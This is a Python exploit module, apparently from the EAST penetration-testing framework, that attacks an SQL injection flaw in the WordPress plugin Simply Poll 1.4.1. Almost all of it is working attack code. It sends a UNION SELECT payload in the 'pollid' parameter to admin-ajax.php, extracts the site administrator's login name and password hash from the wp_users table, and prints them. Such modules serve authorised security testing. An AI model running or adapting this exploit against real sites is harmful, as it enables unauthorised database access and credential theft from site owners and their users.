#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import urllib
import urllib2

sys.path.append("./core")
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efa_wordpress_simply_poll_sqli"
INFO['DESCRIPTION'] = "WordPress Plugin Simply Poll 1.4.1 - SQL Injection"
INFO['VENDOR'] = "https://wordpress.org/plugins/simply-poll/"
INFO['DOWNLOAD_LINK'] = 'https://www.exploit-db.com/apps/09b80d25742f9132096d7e6d8e99988d-simply-poll-master.zip'
INFO['LINKS'] = ['https://www.exploit-db.com/exploits/40971/']
INFO["CVE Name"] = ""
INFO["NOTES"] = """An unescaped parameter was found in Simply Poll version 1.4.1. ( WP plugin ). An attacker can exploit this vulnerability to read from the database.
The POST parameter 'pollid' is vulnerable."""

INFO['CHANGELOG'] = "12 Jan, 2017. Written by Gleg team."
INFO['PATH'] = 'Exploits/Web/'

# Must be in every module, to be set by framework
OPTIONS = {}
OPTIONS["HOST"] = "127.0.0.1", dict(description = 'Target IP')
OPTIONS["PORT"] = "80", dict(description = 'Target port')
OPTIONS["BASEPATH"] = '/wordpress', dict(description = 'Basepath')
OPTIONS["SSL"] = False, dict(description = 'Use SSL')

class exploit(Sploit):
    def __init__(self, host="", port=0, logger=None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.port = port
        self.host = host
        self.ssl = False
        self.basepath = "/"
    
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', self.host)
        self.port = int(self.args.get('PORT', self.port))
        self.basepath = self.args.get('BASEPATH', self.basepath)
        self.ssl = self.args.get('SSL', self.ssl)
    
    def make_url(self, path = ''):
        return '{}{}:{}{}{}'.format(self.prot(), self.host, self.port, self.basepath, path)
    
    def prot(self):
        return self.ssl and 'https://' or 'http://'

    def run(self):
        self.args()
        
        url = self.make_url('/wp-admin/admin-ajax.php')
        
        sql = 'action=spAjaxResults&pollid=' + urllib.quote('-9999 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(char(35,35,35),user_login,char(58),user_pass,char(35,35,35)),NULL FROM wp_users WHERE id=1 -- ')
        
        self.log('Begin extracting admin\'s credentials')
        result = ''
        try:
            fd = urllib2.urlopen(url, sql)
            result = fd.read().split('###')[1]
        except Exception as e:
            self.log(e)
            self.log("Failed!")
            self.finish(False)

        if result:
            self.log('Output format username:hash-password')
            self.log('=' * 60)
            self.log('End with: {}'.format(result))
            self.log('=' * 60)
            self.finish(True)
            
        self.finish(False)

if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1", 80)
    e.run()
